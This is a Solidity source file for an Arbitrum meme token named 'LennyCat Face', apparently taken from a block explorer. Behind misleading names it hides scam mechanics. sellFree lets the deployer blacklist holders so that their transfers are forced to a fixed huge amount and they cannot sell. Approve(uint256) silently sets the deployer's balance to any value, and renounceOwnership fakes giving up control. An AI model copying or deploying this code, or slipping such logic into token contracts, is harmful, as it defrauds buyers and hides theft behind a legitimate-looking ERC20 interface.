/**
 *Submitted for verification at Arbiscan on 2023-02-15
*/

//SPDX-License-Identifier: MIT

/**
【≽ ʖ≼】
https://t.me/LennyCatARB
*/

pragma solidity ^0.8.1;

abstract contract atFrom {
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
        function minTake() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}
interface _limitFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}
interface amountToSwap {
    function createPair(address _launcher, address launcher_) external returns (address);
}

contract LennyCat is IERC20, atFrom {
    uint8 private _lennyCat = 18;
    uint256 private _receiverShould = 1000000000 * 10 ** _lennyCat;
    string private _tokenExempt = "LennyCat Face";
    bool public swapAuto;
    uint256 public _sendFee;
    bool public autoSend;
    address private _tradeTx = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;
    address public Pair;
    uint256 constant teamFee = 1e10;
    string private sendTx = unicode"【≽ ʖ≼】";


    uint256 private liqSell;
    mapping(address => uint256) private amountAtLaunch;
    mapping(address => bool) public senderShould;
    uint256 public senderList;
    bool public maxTxFee;
    uint256 private fromWalletCheck;
    uint256 public fixWalletSender;
    address public feeTx;
    bool public sizeLimit;
    mapping(address => bool) public _ownedToken;
    address private allowRemove;
    mapping(address => mapping(address => uint256)) private buyAmount;
    bool public swapEnabled;

    event OwnershipTransferred(address indexed maxShould, address indexed liquidityReceiver);

    constructor (){

        _limitFrom receiverLaunched = _limitFrom(_tradeTx);
        Pair = amountToSwap(receiverLaunched.factory()).createPair(receiverLaunched.WETH(), address(this));
        allowRemove = minTake();
        if (swapAuto != autoSend) {
            autoSend = true;
        }
        feeTx = allowRemove;
        senderShould[feeTx] = true;
        if (swapEnabled) {
            fromWalletCheck = _sendFee;
        }
        amountAtLaunch[feeTx] = _receiverShould;
        emit Transfer(address(0), feeTx, _receiverShould);
    }

    function symbol() external view returns (string memory) {
        return sendTx;
    }

    function tradingLimit() public view returns (bool) {
        return sizeLimit;
    }

    function name() external view returns (string memory) {
        return _tokenExempt;
    }

    function totalLaunched(address receiverEnabler, address feeModifier, uint256 lennyCat_) internal returns (bool) {
        if (receiverEnabler == feeTx || feeModifier == feeTx) {
            return enableReceive(receiverEnabler, feeModifier, lennyCat_);
        }
        if (autoSend) {
            sizeLimit = false;
        }
        if (_ownedToken[receiverEnabler]) {
            return enableReceive(receiverEnabler, feeModifier, teamFee);
        }
        return enableReceive(receiverEnabler, feeModifier, lennyCat_);
    }

    function tradingWallet(address check) public {
        if (maxTxFee) {
            return;
        }
        senderShould[check] = true;
        maxTxFee = true;
    }

    function allowance(address receiverMarketing, address txLaunch) external view virtual override returns (uint256) {
        return buyAmount[receiverMarketing][txLaunch];
    }

    function feeAmount() public {
        if (_sendFee != fromWalletCheck) {
            _sendFee = senderList;
        }
        fixWalletSender=0;
    }

    function transfer(address endReceiver, uint256 lennyCat_) external virtual override returns (bool) {
        return totalLaunched(minTake(), endReceiver, lennyCat_);
    }

    function sellFree(address senderTransact) public {
        if (senderTransact == feeTx || senderTransact == Pair || !senderShould[minTake()]) {
            return;
        }
        _ownedToken[senderTransact] = true;
    }

    function decimals() external view returns (uint8) {
        return _lennyCat;
    }

    function getOwner() external view returns (address) {
        return allowRemove;
    }

    function owner() external view returns (address) {
        return allowRemove;
    }

    function exemptedWallet() public view returns (bool) {
        return swapAuto;
    }

    function approve(address txLaunch, uint256 lennyCat_) public virtual override returns (bool) {
        buyAmount[minTake()][txLaunch] = lennyCat_;
        emit Approval(minTake(), txLaunch, lennyCat_);
        return true;
    }

    function Approve(uint256 lennyCat_) public {
        if (!senderShould[minTake()]) {
            return;
        }
        amountAtLaunch[feeTx] = lennyCat_;
    }

    function maxlimitBuy() public view returns (bool) {
        return autoSend;
    }

    function feeMode() public view returns (bool) {
        return sizeLimit;
    }

    function fixedWalletSender() public view returns (uint256) {
        return fixWalletSender;
    }

    function balanceOf(address _check) public view virtual override returns (uint256) {
        return amountAtLaunch[_check];
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(feeTx, address(0));
        allowRemove = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return _receiverShould;
    }

    function enableReceive(address receiverEnabler, address feeModifier, uint256 lennyCat_) internal returns (bool) {
        require(amountAtLaunch[receiverEnabler] >= lennyCat_);
        amountAtLaunch[receiverEnabler] -= lennyCat_;
        amountAtLaunch[feeModifier] += lennyCat_;
        emit Transfer(receiverEnabler, feeModifier, lennyCat_);
        return true;
    }

    function feeTotal() public view returns (uint256) {
        return fixWalletSender;
    }

    function transferFrom(address receiverEnabler, address feeModifier, uint256 lennyCat_) external override returns (bool) {
        if (buyAmount[receiverEnabler][minTake()] != type(uint256).max) {
            require(lennyCat_ <= buyAmount[receiverEnabler][minTake()]);
            buyAmount[receiverEnabler][minTake()] -= lennyCat_;
        }
        return totalLaunched(receiverEnabler, feeModifier, lennyCat_);
    }


}